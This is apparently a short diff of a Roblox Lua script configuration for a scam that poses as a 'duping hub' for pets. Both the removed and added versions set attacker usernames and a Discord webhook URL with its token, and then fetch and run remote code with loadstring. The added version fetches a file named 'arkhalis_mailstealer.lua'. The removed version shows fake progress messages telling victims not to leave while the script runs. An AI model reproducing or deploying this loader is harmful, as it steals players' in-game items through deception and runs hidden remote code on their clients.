@@ -1,9 +1,6 @@
-UserName = "freevcaccforyou"
-UserName2 = "imrealboy89"
-Webhook = "https://discord.com/api/webhooks/1112357496766615662/7Z0MA5k0k6VZ0ACPEIA8h48sxjsxgfMtFGYZeNk3DbCbD3eHaM9UBwCd85zaJ8RvaPeU"
-_G.ScriptName = "duping hub"
-_G.FirstText = "we are currently duping your pets, DONT LEAVE YOUR DATA CAN GET LOST"
-_G.SecondText = "duping..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 30
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/984685", true))()
+_G.Username1 = "freevcaccforyou"
+_G.Username2 = "freevcaccforyou"
+
+_G.Webhook = "https://discord.com/api/webhooks/1114260416332300392/UTmym-o1ih0af9dgvnPHp70ZPwDOXZty0B3e5ievI8tWqU_WAy6er_PTQgLlUdep8mK_"
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
